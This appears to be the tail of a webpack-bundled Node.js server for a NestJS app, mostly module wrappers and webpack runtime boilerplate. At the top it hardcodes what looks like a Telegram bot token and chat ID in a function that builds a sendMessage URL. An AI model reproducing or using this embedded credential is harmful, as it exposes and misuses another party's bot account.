  } else {
    token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`
  }

  return `https://api.telegram.org/${token}/sendMessage?chat_id=-1001801844217`
}

/***/ }),

/***/ "@nestjs/core":
/*!*******************************!*\
  !*** external "@nestjs/core" ***!
  \*******************************/
/***/ ((module) => {

module.exports = require("@nestjs/core");

/***/ }),

/***/ "@nestjs/platform-express":
/*!*******************************************!*\
  !*** external "@nestjs/platform-express" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("@nestjs/platform-express");

/***/ }),

/***/ "@nestjs/swagger":
/*!**********************************!*\
  !*** external "@nestjs/swagger" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("@nestjs/swagger");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "body-parser":
/*!******************************!*\
  !*** external "body-parser" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("body-parser");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "commonService":
/*!********************************!*\
  !*** external "commonService" ***!
  \********************************/
/***/ ((module) => {

module.exports = require("commonService");

/***/ }),

/***/ "cors":
/*!***********************!*\
  !*** external "cors" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("cors");

/***/ }),

/***/ "dotenv":
/*!*************************!*\
  !*** external "dotenv" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("dotenv");

/***/ }),

/***/ "express":
/*!**************************!*\
  !*** external "express" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("express");

/***/ }),

/***/ "imap":
/*!***********************!*\
  !*** external "imap" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("imap");

/***/ }),

/***/ "mongodb":
/*!**************************!*\
  !*** external "mongodb" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("mongodb");

/***/ }),

/***/ "mongoose":
/*!***************************!*\
  !*** external "mongoose" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("mongoose");

/***/ }),

/***/ "node-schedule-tz":
/*!***********************************!*\
  !*** external "node-schedule-tz" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("node-schedule-tz");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/events/index.js":
/*!*******************************************!*\
  !*** external "telegram/events/index.js" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("telegram/events/index.js");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "child_process":
/*!********************************!*\
  !*** external "child_process" ***!
  \********************************/
/***/ ((module) => {

module.exports = require("child_process");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/async module */
/******/ 	(() => {
/******/ 		var webpackQueues = typeof Symbol === "function" ? Symbol("webpack queues") : "__webpack_queues__";
/******/ 		var webpackExports = typeof Symbol === "function" ? Symbol("webpack exports") : "__webpack_exports__";
/******/ 		var webpackError = typeof Symbol === "function" ? Symbol("webpack error") : "__webpack_error__";
/******/ 		var resolveQueue = (queue) => {
/******/ 			if(queue && queue.d < 1) {
/******/ 				queue.d = 1;
/******/ 				queue.forEach((fn) => (fn.r--));
/******/ 				queue.forEach((fn) => (fn.r-- ? fn.r++ : fn()));
/******/ 			}
/******/ 		}
/******/ 		var wrapDeps = (deps) => (deps.map((dep) => {
/******/ 			if(dep !== null && typeof dep === "object") {
/******/ 				if(dep[webpackQueues]) return dep;
/******/ 				if(dep.then) {
/******/ 					var queue = [];
/******/ 					queue.d = 0;
/******/ 					dep.then((r) => {
/******/ 						obj[webpackExports] = r;
/******/ 						resolveQueue(queue);
/******/ 					}, (e) => {
/******/ 						obj[webpackError] = e;
/******/ 						resolveQueue(queue);
/******/ 					});
/******/ 					var obj = {};
/******/ 					obj[webpackQueues] = (fn) => (fn(queue));
/******/ 					return obj;
/******/ 				}
/******/ 			}
/******/ 			var ret = {};
/******/ 			ret[webpackQueues] = x => {};
/******/ 			ret[webpackExports] = dep;
/******/ 			return ret;
/******/ 		}));
/******/ 		__webpack_require__.a = (module, body, hasAwait) => {
/******/ 			var queue;
/******/ 			hasAwait && ((queue = []).d = -1);
/******/ 			var depQueues = new Set();
/******/ 			var exports = module.exports;
/******/ 			var currentDeps;
/******/ 			var outerResolve;
/******/ 			var reject;
/******/ 			var promise = new Promise((resolve, rej) => {
/******/ 				reject = rej;
/******/ 				outerResolve = resolve;
/******/ 			});
/******/ 			promise[webpackExports] = exports;
/******/ 			promise[webpackQueues] = (fn) => (queue && fn(queue), depQueues.forEach(fn), promise["catch"](x => {}));
/******/ 			module.exports = promise;
/******/ 			body((deps) => {
/******/ 				currentDeps = wrapDeps(deps);
/******/ 				var fn;
/******/ 				var getResult = () => (currentDeps.map((d) => {
/******/ 					if(d[webpackError]) throw d[webpackError];
/******/ 					return d[webpackExports];
/******/ 				}))
/******/ 				var promise = new Promise((resolve) => {
/******/ 					fn = () => (resolve(getResult));
/******/ 					fn.r = 0;
/******/ 					var fnQueue = (q) => (q !== queue && !depQueues.has(q) && (depQueues.add(q), q && !q.d && (fn.r++, q.push(fn))));
/******/ 					currentDeps.map((dep) => (dep[webpackQueues](fnQueue)));
/******/ 				});
/******/ 				return fn.r ? promise : getResult();
/******/ 			}, (err) => ((err ? reject(promise[webpackError] = err) : outerResolve(exports)), resolveQueue(queue)));
/******/ 			queue && queue.d < 0 && (queue.d = 0);
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	(() => {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = (module) => {
/******/ 			var getter = module && module.__esModule ?
/******/ 				() => (module['default']) :
/******/ 				() => (module);
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module used 'module' so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./index.js");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var i in __webpack_exports__) __webpack_export_target__[i] = __webpack_exports__[i];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=server.js.map